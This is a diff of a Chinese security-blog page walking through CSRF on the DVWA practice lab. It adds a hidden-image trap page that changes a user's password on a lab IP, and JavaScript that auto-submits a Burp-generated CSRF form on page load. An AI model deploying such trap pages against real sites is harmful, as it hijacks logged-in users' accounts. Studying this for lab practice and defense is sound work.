@@ -194,7 +194,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      816 字
+      1.1k 字
     </span>
   
 
@@ -204,7 +204,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      12
        分钟
     </span>
   
@@ -251,12 +251,21 @@
 <hr>
 <h3 id="CSRF的攻击方式"><a href="#CSRF的攻击方式" class="headerlink" title="CSRF的攻击方式"></a>CSRF的攻击方式</h3><p>根据网站页面的漏洞构造payload，在用户登录的情况下点击后，凭借用户的信息去执行一系列命令。</p>
 <p>以dvwa的csrf靶场中的low级别为例，在这里假设我们的目的为修改某一个用户的密码。</p>
-<p>我们先抓取修改密码时的数据包，利用burp生成CSRF Poc页面的功能，根据这个数据包生成一个html文件。</p>
+<p>在这关中直接构造一个链接即可，用户点击这个链接就会执行命令。为了增加隐蔽性，我们可以在自己的站点设置HTML文件，使得其访问链接不包含参数，看上去危险性会比较低，更容易使用户访问。</p>
+<p>这个HTML网页可以这样写</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&lt;!DOCUPYTE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>	&lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>	&lt;title&gt;img_src_get&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>	&lt;h1&gt;get <span class="hljs-keyword">for</span> img src&lt;/h1&gt;<br>	&lt;img stytle=<span class="hljs-string">&quot;display:none&quot;</span> src=<span class="hljs-string">&quot;http://192.168.111.142/DVWA-master/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change&quot;</span>alt=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>这样当用户访问我们站点时，遇到img，发送get请求去找图片的资源。而这里的请求不是访问图片而是访问我们构造好的url，其作用是访问具有csrf漏洞的对应站点并执行一系列命令。</p>
+<p>另外我们也可以利用burp生成CSRF Poc页面的功能，来生成陷阱html文件。</p>
+<p>先抓取修改密码时的数据包，action中选择CSRF Poc，根据这个数据包生成一个html文件。</p>
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220314212232.png" srcset="/img/loading.gif" lazyload></p>
-<p>这个html即是触发csrf的陷阱网页。根据刚才数据包提交的参数，这里创建了一个表单，并隐藏了对应参数。</p>
+<p>根据刚才数据包提交的参数，这里创建了一个表单，并隐藏了对应参数。</p>
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220314214047.png" srcset="/img/loading.gif" lazyload></p>
-<p>当用户点击提交时，就会利用当前用户的身份去执行form action中的操作，在这里即为修改密码。</p>
-<p>直接构造一个这个链接也是可以的，如果用户点击这个链接也是一样的效果，但这样设计网页更容易使用户触发漏洞，因为攻击者可以在网页中添加迷惑信息。</p>
+<p>在用户已经登录了对应站点的情况下，当用户点击提交时，就会利用当前用户的身份去执行form action中的操作，在这里即为修改对应站点账号的密码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//值得注意的是，这样的话需要用户点击链接后再点击一下提交才能实现攻击，成功率可能较低</span><br><span class="hljs-comment">//所以我们可以加上下面一段js代码，使得当页面加载完成时自动提交表单</span><br><br>&lt;script&gt;<br><br><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;submit&quot;</span>).click();<span class="hljs-comment">//typt=&quot;submit&quot;的属性框中加上对应的id=&quot;submit&quot;</span><br><br>&#125;         <br><br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure>
+
+
+
 <p>当用户点击提交后就可以看到密码已被修改。实际情况下攻击者构造的陷阱网页不会这么明显，不会使用户意识到发生了什么。</p>
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220314215711.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="CSRF漏洞代码分析及防御措施"><a href="#CSRF漏洞代码分析及防御措施" class="headerlink" title="CSRF漏洞代码分析及防御措施"></a>CSRF漏洞代码分析及防御措施</h3><p>…实际上存在csrf漏洞的网页的代码在结构和逻辑上并没有什么特性，为用户设置身份信息且用户有一些执行命令的权限以及对用户身份验证环节的薄弱（或身份信息易被伪造）就是共同点。</p>
@@ -304,9 +313,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/16/CSRF%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+                      <a href="/2022/03/16/csrf%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CSRF靶场练习</span>
+                        <span class="hidden-mobile">csrf靶场练习</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
